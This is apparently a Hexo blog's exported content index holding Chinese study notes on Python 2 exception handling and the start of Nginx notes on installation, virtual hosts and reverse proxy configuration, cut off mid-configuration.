title="如何处理异常？"></a>如何处理异常？</h3><p>python提供了两个非常重要的功能来处理python程序在运行中出现的异常和错误。可用该功能来调试python程序。</p><ul><li>异常处理</li><li>断言(Assertions)</li></ul><hr><h4 id="异常处理？"><a href="#异常处理？" class="headerlink" title="异常处理？"></a>异常处理？</h4><ul><li><p>捕捉异常可以使用try/except语句。</p></li><li><p>try/except语句用来检测try语句块中的错误，从而让except语句捕获异常信息并处理。</p></li><li><p>如果不想在异常发生时结束程序，只需在try里捕获它即可。</p></li></ul><h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><p>以下为简单的<em>try….except…else</em>的语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">&lt;语句&gt;        <span class="comment">#运行别的代码</span></span><br><span class="line"><span class="keyword">except</span> &lt;名字&gt;：</span><br><span class="line">&lt;语句&gt;        <span class="comment">#如果在try部份引发了&#x27;name&#x27;异常</span></span><br><span class="line"><span class="keyword">except</span> &lt;名字&gt;，&lt;数据&gt;:</span><br><span class="line">&lt;语句&gt;        <span class="comment">#如果引发了&#x27;name&#x27;异常，获得附加的数据</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">&lt;语句&gt;        <span class="comment">#如果没有异常发生</span></span><br></pre></td></tr></table></figure><h5 id="try的工作原理"><a href="#try的工作原理" class="headerlink" title="try的工作原理"></a>try的工作原理</h5><p>当开始一个try语句后，python就在当前程序的上下文中作标记，这样当异常出现时就可以回到这里，try子句先执行，接下来会发生什么依赖于执行时是否出现异常。以上面的代码为例：</p><ul><li>如果当try后的语句执行时发生异常，python就跳回到try并执行第一个匹配该异常的except子句，异常处理完毕，控制流就通过整个try语句（除非在处理异常时又引发新的异常）。</li><li>如果在try后的语句里发生了异常，却没有匹配的except子句，异常将被递交到上层的try，或者到程序的最上层（这样将结束程序，并打印默认的出错信息）。</li><li>如果在try子句执行时没有发生异常，python将执行else语句后的语句（如果有else的话），然后控制流通过整个try语句。</li></ul><h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><p>下面是简单的例子，它打开一个文件，在该文件中的内容写入内容，但文件没有写入权限，发生了异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    fh = <span class="built_in">open</span>(<span class="string">&quot;testfile&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    fh.write(<span class="string">&quot;这是一个测试文件，用于测试异常!!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> IOError:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Error: 没有找到文件或读取文件失败&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;内容写入文件成功&quot;</span></span><br><span class="line">    fh.close()</span><br></pre></td></tr></table></figure><p>在执行代码前为了测试方便，我们可以先去掉 testfile 文件的写权限，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -w testfile</span><br></pre></td></tr></table></figure><p>再执行以上代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py </span><br><span class="line">Error: 没有找到文件或读取文件失败</span><br></pre></td></tr></table></figure><hr><h5 id="except不带任何异常类型"><a href="#except不带任何异常类型" class="headerlink" title="except不带任何异常类型"></a>except不带任何异常类型</h5><p>不带任何异常类型使用except：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    正常的操作   </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    发生异常，执行这块代码</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    如果没有异常执行这块代码</span><br></pre></td></tr></table></figure><ul><li>以上方式能捕获所有的异常但不能识别异常；</li></ul><h5 id="except带多种异常类型"><a href="#except带多种异常类型" class="headerlink" title="except带多种异常类型"></a>except带多种异常类型</h5><p>可以使用相同的except语句来处理多个异常信息，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    正常的操作</span><br><span class="line"><span class="keyword">except</span>(Exception1[, Exception2[,...ExceptionN]]):</span><br><span class="line">   发生以上多个异常中的一个，执行这块代码</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    如果没有异常执行这块代码</span><br></pre></td></tr></table></figure><hr><h5 id="try-finally-语句"><a href="#try-finally-语句" class="headerlink" title="try-finally 语句"></a>try-finally 语句</h5><p>try-finally 语句无论是否发生异常都将执行最后的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">&lt;语句&gt;</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">&lt;语句&gt;    <span class="comment">#退出try时总会执行</span></span><br><span class="line"><span class="keyword">raise</span></span><br></pre></td></tr></table></figure><h6 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    fh = <span class="built_in">open</span>(<span class="string">&quot;testfile&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    fh.write(<span class="string">&quot;这是一个测试文件，用于测试异常!!&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Error: 没有找到文件或读取文件失败&quot;</span></span><br></pre></td></tr></table></figure><p>如果打开的文件没有可写权限，输出如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py </span><br><span class="line">Error: 没有找到文件或读取文件失败</span><br></pre></td></tr></table></figure><p>同样的例子也可以写成如下方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    fh = <span class="built_in">open</span>(<span class="string">&quot;testfile&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fh.write(<span class="string">&quot;这是一个测试文件，用于测试异常!!&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;关闭文件&quot;</span></span><br><span class="line">        fh.close()</span><br><span class="line"><span class="keyword">except</span> IOError:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Error: 没有找到文件或读取文件失败&quot;</span></span><br></pre></td></tr></table></figure><ul><li><p>当在try块中抛出一个异常，立即执行finally块代码。</p></li><li><p>finally块中的所有语句执行后，<strong>异常被再次触发</strong>，并执行except块代码。</p></li><li><p>参数的内容不同于异常。</p></li></ul><hr><h3 id="异常的参数是什么？"><a href="#异常的参数是什么？" class="headerlink" title="异常的参数是什么？"></a>异常的参数是什么？</h3><ul><li><p>一个异常可以带上参数，可作为输出的异常信息参数。</p></li><li><p>可通过except语句来捕获异常的参数，如下所示：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    正常的操作</span><br><span class="line"><span class="keyword">except</span> ExceptionType, Argument:</span><br><span class="line">    在这输出 Argument 的值...</span><br></pre></td></tr></table></figure><ul><li><p>变量接收的异常值通常包含在异常的语句中。在<strong>元组</strong>的表单中变量可以接收一个或者多个值。</p></li><li><p>元组通常包含错误字符串，错误数字，错误位置。</p></li></ul><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><p>以下为单个异常的实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">temp_convert</span>(<span class="params">var</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(var)</span><br><span class="line">    <span class="keyword">except</span> ValueError, Argument:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;参数没有包含数字\n&quot;</span>, Argument</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">temp_convert(<span class="string">&quot;xyz&quot;</span>);</span><br></pre></td></tr></table></figure><p>以上程序执行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py </span><br><span class="line">参数没有包含数字</span><br><span class="line">invalid literal <span class="keyword">for</span> int() with base 10: <span class="string">&#x27;xyz&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="如何自己触发异常？"><a href="#如何自己触发异常？" class="headerlink" title="如何自己触发异常？"></a>如何自己触发异常？</h3><p>我们可以使用raise语句自己触发异常，raise语句可以在try的if中。</p><p>raise语法格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">raise</span> [Exception [, args [, traceback]]]</span><br></pre></td></tr></table></figure><ul><li><p>语句中 Exception 是异常的类型（例如，NameError）参数标准异常中任一种，args 是自已提供的异常参数。</p></li><li><p>最后一个参数是可选的（在实践中很少使用），如果存在，是跟踪异常对象。</p></li></ul><h4 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h4><p>一个<strong>异常可以是一个字符串，类或对象</strong>。 Python的内核提供的异常，大多数都是实例化的类，这是一个类的实例的参数。</p><p>定义一个异常非常简单，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">functionName</span>(<span class="params"> level </span>):</span></span><br><span class="line">    <span class="keyword">if</span> level &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Invalid level!&quot;</span>, level)</span><br><span class="line">        <span class="comment"># 触发异常后，后面的代码就不会再执行</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong>为了能够捕获异常，”except”语句必须有<strong>用相同的异常</strong>来抛出类对象或者字符串。说白了就是except后面跟的要和try中自己raise的Exception名字一样。</p><p>例如我们捕获以上异常，”except”语句如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    正常逻辑</span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line">    触发自定义异常    </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    其余代码</span><br></pre></td></tr></table></figure><h4 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mye</span>(<span class="params"> level </span>):</span></span><br><span class="line">    <span class="keyword">if</span> level &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception,<span class="string">&quot;Invalid level!&quot;</span></span><br><span class="line">        <span class="comment"># 触发异常后，后面的代码就不会再执行</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    mye(<span class="number">0</span>)            <span class="comment"># 触发异常</span></span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line">    <span class="built_in">print</span> <span class="number">1</span>,err</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><p>执行以上代码，输出结果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py </span><br><span class="line">1 Invalid level!</span><br></pre></td></tr></table></figure><hr><h3 id="如何自定义异常？"><a href="#如何自定义异常？" class="headerlink" title="如何自定义异常？"></a>如何自定义异常？</h3><ul><li><p>通过创建一个新的异常类，程序可以命名它们自己的异常。异常应该是典型的继承自Exception的类，通过直接或间接的方式。</p></li><li><p>以下为与RuntimeError相关的实例,实例中创建了一个类，基类为RuntimeError，用于在异常触发时输出更多的信息。</p></li></ul><p>在try语句块中，用户自定义的异常后执行except块语句，变量 e 是用于创建Networkerror类的实例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Networkerror</span>(<span class="params">RuntimeError</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, arg</span>):</span></span><br><span class="line">        self.args = arg</span><br></pre></td></tr></table></figure><p>在定义以上类后，可以触发该异常，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> Networkerror(<span class="string">&quot;Bad hostname&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Networkerror,e:</span><br><span class="line">    <span class="built_in">print</span> e.args</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx学习笔记</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Nginx%E7%AC%94%E8%AE%B0/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Nginx%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="什么是-nginx—engin-x"><a href="#什么是-nginx—engin-x" class="headerlink" title="什么是 #nginx—engin x"></a>什么是 #nginx—engin x</h3><ul><li>俄罗斯lgor sysoev开发</li><li>web服务器，反向代理服务器</li><li>邮箱IMAP POP3 SMTP代理服务器</li><li>比起Apache，高并发能承载5w并连接</li><li>cpu，内存资源消耗低，运行稳定</li></ul><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li>http服务器，可以独立提供http服务，作为网页静态服务器</li><li>虚拟主机——一台服务器虚拟出多个网站，多个域名映射到同一个主机</li><li>负载均衡，反向代理的延伸</li><li>反向代理，隐藏后端服务器的数量——提高后端服务器安全性</li><li>动静分离，反向代理的延伸，静态资源直接nginx负责 动态资源代理到后端</li><li>域名重定向，解决老用户访问老域名用户流失问题</li><li>内部重定向，用户访问没有的资源，返回特定页面</li><li>缓存服务器</li><li>邮件代理服务器</li><li>微服务网关</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><p>nginx在默认的ubuntu源仓库中就有</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nginx</span><br><span class="line">sudo systemctl status nginx</span><br></pre></td></tr></table></figure><h4 id="防火墙开启80和443"><a href="#防火墙开启80和443" class="headerlink" title="防火墙开启80和443"></a>防火墙开启80和443</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow <span class="string">&#x27;Nginx Full&#x27;</span>  <span class="comment">#UFW中把这两个端口打包套餐成nginx full</span></span><br><span class="line">sudo ufw status</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p><a href="https://www.cnblogs.com/hanease/p/16193615.html">https://www.cnblogs.com/hanease/p/16193615.html</a></p><p>菜鸟</p><p>Nginx 配置文件在 conf 目录下，其默认目录结构如下。</p><p>conf/<br>  ├── fastcgi.conf<br>  ├── fastcgi.conf.default<br>  ├── fastcgi_params<br>  ├── fastcgi_params.default<br>  ├── koi-utf<br>  ├── koi-win<br>  ├── mime.types<br>  ├── mime.types.default<br>  ├── nginx.conf<br>  ├── nginx.conf.default<br>  ├── scgi_params<br>  ├── scgi_params.default<br>  ├── uwsgi_params<br>  ├── uwsgi_params.default<br>  └── win-utf</p><p>其中，以“.default”为扩展名的文件是 Nginx 配置文件的配置样例文件。各配置文件的说明如下。</p><ul><li>fastcgi_params：Nginx 在配置 FastCGI 代理服务时会根据 fastcgi_params 文件的配置向 FastCGI 服务器传递变量，该配置文件现已由 fastcgi.conf 代替；</li><li>fastcgi.conf：为了规范配置指令 SCRIPT_FILENAME 的用法，引入 FastCGI 变量传递配置；</li><li>mime.types：MIME 类型映射表，Nginx 会根据服务端文件后缀名在映射关系中获取所属文件类型，将文件类型添加到 HTTP 消息头字段“Content-Type”中；</li><li>nginx.conf：Nginx 默认的配置入口文件；</li><li>scgi_params：Nginx 在配置 SCGI 代理服务时会根据 scgi_params 文件的配置向 SCGI 服务器传递变量；</li><li>uwsgi_params：Nginx 在配置 uWSGI 代理服务时会根据 uwsgi_params 文件的配置向 uWSGI 服务器传递变量；</li><li>koi-utf、koi-win、win-utf：这 3 个文件是 KOI8-R 编码转换的映射文件，因为 Nginx 的作者是俄罗斯人，在 Unicode 流行之前，KOI8-R 是使用最为广泛的俄语编码。</li></ul><h2 id="配置详解"><a href="#配置详解" class="headerlink" title="配置详解"></a>配置详解</h2><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><h4 id="nginx-conf"><a href="#nginx-conf" class="headerlink" title="nginx.conf"></a>nginx.conf</h4><p>Nginx 默认的主配置文件是 nginx.conf，这也是 Nginx 唯一的默认配置入口</p><p>/etc/nginx.conf</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221102161459518.png" alt="image-20221102161459518"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221102161554640.png" alt="image-20221102161554640"></p><h3 id="虚拟主机配置"><a href="#虚拟主机配置" class="headerlink" title="虚拟主机配置"></a>虚拟主机配置</h3><p>多个域名映射到同一台Nginx服务器80端口，在配置文件中写入不同server块，一个块代表一个虚拟的服务器</p><p>本地虚拟机实验，修改window的hosts文件：（C:\Windows\System32\drivers\etc）</p><p>192.168.11.132 aaa.test.com 192.168.11.132 bbb.test.com</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#配置虚拟主机aaa.test.com</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#监听的ip和端口，配置本机ip和端口</span></span><br><span class="line">    <span class="attribute">listen</span> <span class="number">192.168.11.132:80</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#虚拟主机名称是aaa.test.com，请求域名aaa.test.com的url将由此server配置解析</span></span><br><span class="line">    <span class="attribute">server_name</span> aaa.test.com;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#所有的请求都以/开始路由，所有的请求都可以匹配此location</span></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="comment">#使用root指令指定虚拟主机目录即网页存放目录</span></span><br><span class="line">        <span class="comment">#比如访问http://ip/test.html将找到/usr/local/aaa_html/test.html</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#比如访问http://ip/item/test.html将找到/usr/local/aaa_html/item/test.html</span></span><br><span class="line">        <span class="attribute">root</span> /usr/local/aaa_html;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#指定欢迎页面，按从左到右顺序查找</span></span><br><span class="line">        <span class="attribute">index</span> index.html index.htm;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置虚拟主机bbb.test.com</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">192.168.11.132:80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> bbb.test.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span> /usr/local/bbb_html;</span><br><span class="line">        <span class="attribute">index</span> index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="反向代理配置"><a href="#反向代理配置" class="headerlink" title="反向代理配置"></a>反向代理配置</h3><p>反向代理是一种服务，它接受客户端请求，将请求发送到一个或多个后端服务器，获取响应，然后将服务器的响应传递给客户端，客户端通常浏览器，也可以是curl</p><p>由于其性能和可伸缩性，Nginx通常用作HTTP和非HTTP服务器的反向代理。典型的反向代理配置是将Nginx放在Node.js，Python或Java应用程序的前面</p><p>要将Nginx配置为HTTP服务器的反向代理，需要打开nginx虚拟服务器配置文件，并在其中location的上下文使用<code>proxy_pass</code>指令设置要代理的服务器。在Ubuntu和Debian的发行版中，服务器配置文件存储在<code>/etc/nginx/sites-enabled</code>目录中，而在CentOS则存储在<code>/etc/nginx/conf.d</code>目录中。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> www.example.com example.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> /app &#123;</span><br><span class="line">       <span class="attribute">proxy_pass</span> http://127.0.0.1:8080; </span><br><span class="line">        <span class="comment">#Nginx将所有以/app开头的请求传递到到http://127.0.0.1:8080服务器</span></span><br><span class="line">        <span class="comment">#代理服务器的URL使用proxy_pass指令设置，可以将HTTP或HTTPS用作协议，域名或IP地址作为主机名，并使用可选的端口和URI作为地址。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当Nginx代理请求时，它会自动删除来自客户端请求中定义两个头字段<code>Host</code>和<code>Connection</code>以及删除空的Header。将<code>Host</code>设置为<code>$proxy_host</code>变量，<code>Connection</code>设置为off。为了让应用可以获取来自客户端header，需要使用<code>proxy_set_header</code>指令，后跟header值。来设置正确Header传递应用。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host $host;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Accept-Encoding <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重启nginx生效</p><hr><h4 id="Nginx-fastcgi-memcached"><a href="#Nginx-fastcgi-memcached" class="headerlink" title="Nginx fastcgi memcached"></a>Nginx fastcgi memcached</h4><p>要将Nginx配置为<strong>非HTTP代理服务器</strong>的反向代理，可以使用指令包括，</p><ul><li>fastcgi_pass配置<strong>FastCGI服务器代理</strong>。</li><li>uwsgi_pass配置<strong>uwsgi服务器代理</strong>。</li><li>scgi_pass配置<strong>SCGI服务器代理</strong>。</li><li>memcached_pass配置<strong>Memcached服务器代理</strong>。</li></ul><p>最常见的例子之一就是配置PHP-FPM的FastCGI代理。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ... other directives</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line">        <span class="attribute">fastcgi_pass</span> unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="proxy-pass代理配置"><a href="#proxy-pass代理配置" class="headerlink" title="proxy_pass代理配置"></a>proxy_pass代理配置</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">location/ &#123;</span><br><span class="line">  <span class="attribute">proxy_pass</span> http://127.0.0.1:3000;</span><br><span class="line">  <span class="attribute">proxy_http_version</span>  <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">  <span class="attribute">proxy_cache_bypass</span>  $http_upgrade;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">proxy_set_header</span> Upgrade           $http_upgrade;</span><br><span class="line">  <span class="attribute">proxy_set_header</span> Connection        <span class="string">&quot;upgrade&quot;</span>;</span><br><span class="line">  